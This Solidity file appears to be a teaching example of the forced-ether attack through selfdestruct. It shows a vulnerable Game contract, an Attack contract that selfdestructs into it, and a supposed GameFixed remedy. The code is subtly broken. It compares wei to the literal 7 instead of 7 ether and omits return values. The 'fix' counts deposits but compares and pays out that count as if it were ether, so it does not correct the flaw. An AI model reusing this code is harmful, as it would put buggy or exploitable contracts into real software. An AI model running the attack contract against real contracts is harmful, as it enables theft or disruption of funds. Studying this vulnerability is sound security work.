// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// embedded function selfdestruct(address) 
// can destroy the contract and send it`s 
// balance to address EVEN IT DOES NOT HAVE THE PAYABLE FALLBACK

// This is an example of it`s usage and vulnerability:

contract Game {
    error NotApplicableAmountForDepositError(address addr, uint256 amount);
    error GameIsOverError();
    error UnableToSendPrize();

    uint256 private constant _targetAmount = 7 ether;

    function deposit() external payable returns(bool) {
        if (msg.value != 1 ether) {
            revert NotApplicableAmountForDepositError(msg.sender, msg.value);
        }

        uint256 balance = address(this).balance;
        if (balance > 7) {
            revert GameIsOverError();
        }

        if (balance == _targetAmount) {
            bool success = payable(msg.sender).send(balance);
            if (!success) {
                revert UnableToSendPrize();
            }
        }
    }
}

contract Attack {
    error InsufficientAmountForAttack(uint256 amount, uint256 required);
    Game private immutable game;

    constructor(address gameAddr) {
        game = Game(gameAddr);
    }

    function attack(uint256 amount) external {
        uint256 balance = address(this).balance;
        if (balance < amount) {
            revert InsufficientAmountForAttack(balance, amount);
        }

        selfdestruct(payable(address(game)));
    }
}

// fix - not rely on address(this).balance instead create separate variable
contract GameFixed {
        error NotApplicableAmountForDepositError(address addr, uint256 amount);
    error GameIsOverError();
    error UnableToSendPrize();

    uint256 private constant _targetAmount = 7 ether;
    uint256 private balance;

    constructor() {
        balance = 0;
    }

    function deposit() external payable returns(bool) {
        if (msg.value != 1 ether) {
            revert NotApplicableAmountForDepositError(msg.sender, msg.value);
        }

        if (balance > 7) {
            revert GameIsOverError();
        }

        if (balance == _targetAmount) {
            bool success = payable(msg.sender).send(balance);
            if (!success) {
                revert UnableToSendPrize();
            }
        }

        balance++;
    }
}